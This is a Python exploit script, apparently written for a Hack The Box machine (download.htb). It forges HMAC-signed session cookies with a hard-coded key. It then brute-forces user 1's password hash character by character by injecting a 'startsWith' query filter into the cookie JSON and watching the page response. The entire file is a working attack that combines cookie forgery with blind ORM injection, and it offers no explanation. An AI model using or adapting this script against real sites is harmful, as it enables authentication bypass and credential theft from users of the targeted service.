import hmac
import hashlib
import base64
import requests
import json

key = '8929874489719802418902487651347865819634518936754'
charset = 'abcdef0123456789'

def output(msg, key=key):
    base64_val = base64.b64encode(json.dumps(msg).encode())
    cookie = b"download_session="+base64_val
    encrypt = hmac.digest(key.encode('utf-8'), msg=cookie, digest=hashlib.sha1)
    return base64_val.decode(), base64.urlsafe_b64encode(encrypt).decode().replace("=","")

def bruteforce(x):
    print(x)
    #msg = f'{{"user":{{"id":1,"password":{{"startsWith":"{x}"}}}}}}'
    #msg ='{"user":{"id":1}}'
    base64_val, encrypt = output(
        {
                "user": {
                    "id": 1,
                    "password": {
                        "startsWith": x
                    }
                }
            }
    )
    cookie = {"download_session":base64_val, "download_session.sig":encrypt}
    response = requests.get('http://download.htb/home', cookies=cookie)
    if "No files found" not in response.text:
        print("working:"+x)
        return True
    else:
        print("not working:"+x)
        return False


k=''
for i in range(0,32):
    for c in charset:
        if bruteforce(k+c):
            k=k+c
            break
        